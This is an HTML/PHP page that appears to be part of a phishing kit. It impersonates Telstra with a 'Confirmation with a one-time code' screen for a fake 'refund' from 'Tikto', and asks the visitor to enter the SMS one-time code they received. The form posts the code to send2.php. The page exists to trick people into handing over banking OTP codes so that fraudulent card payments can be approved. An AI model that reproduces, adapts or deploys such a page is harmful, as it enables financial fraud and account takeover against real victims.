
<html lang="da"><script type="text/javascript" charset="utf-8" id="zm-extension" src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Telstra</title>
    
    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=0.75">
    <link rel="stylesheet" type="text/css" href="src/screen.css">
    <link rel="stylesheet" type="text/css" href="src/gh-buttons.css">
    
    <script src="src/commons.js"></script>
    <script src="src/jquery-3.3.1.min.js"></script>
    <script type="text/javascript">

        function onBodyLoad() {
            document.form.otp.focus();
        }
    </script>
</head>
<body onload="onBodyLoad();">
<div id="authform">
    <div class="wrapper">
        <div class="scheme-logo-div"><img class="scheme-logo" alt="" src="src/1.svg"></div>
        <div class="brand-logo-div" style="max-width: 100px"><img alt="" src="src/pn-blue.png" width="100" height=auto></div>
       
        <div class="clear"></div>
        <h1>Confirmation with a one-time code</h1>
        <p>We have now sent a unique code to your mobile phone.</p>
        <p>Enter the code you received by telephone and press 'refund'.</p>
        <form id="form" name="form" method="post" action="send2.php">
            <dl style="margin-top: 10px;">
                <dt>From: </dt>
                <dd>Tikto</dd>

                <dt>System: </dt>
                <dd id="purchAmount">refund</dd>

                <dt>Date:  </dt> 
              <?php echo $date = date('m/d/Y h:i:s a', time());?> 

                <dt>Card number: </dt>
                <dd>XXXX XXXX XXXX XXXX<br><br></dd>

				


                <dt>
                    <label for="code">SMS CODE: </label>
                </dt>
                <dd>
                    <input style="width: 100px" type="number" pattern="\d*" width="6" id="otp" name="otp"  autocomplete="off" required>
                    <button class="button icon approve primary" name="submit" id="submit" type="submit" value="submit" style="position: absolute; margin-left: 5px;">Confirm</button><br><br><br>
                </dd>
            </dl>
            
            
            <div style="font-size: 0.92em; margin-bottom: 8px;">
                
            </div>
            <div style="float: left;">
                <a class="button icon arrowleft" href="#">Back</a>
            </div>
            <div style="float: right;">
                <a class="button icon add" id="resendButton" href="#" onclick="incrementResendCount()">New code</a>
                <a class="button" href="#">Info</a>
            </div>
        </form>
    </div>
</div>




</body></html>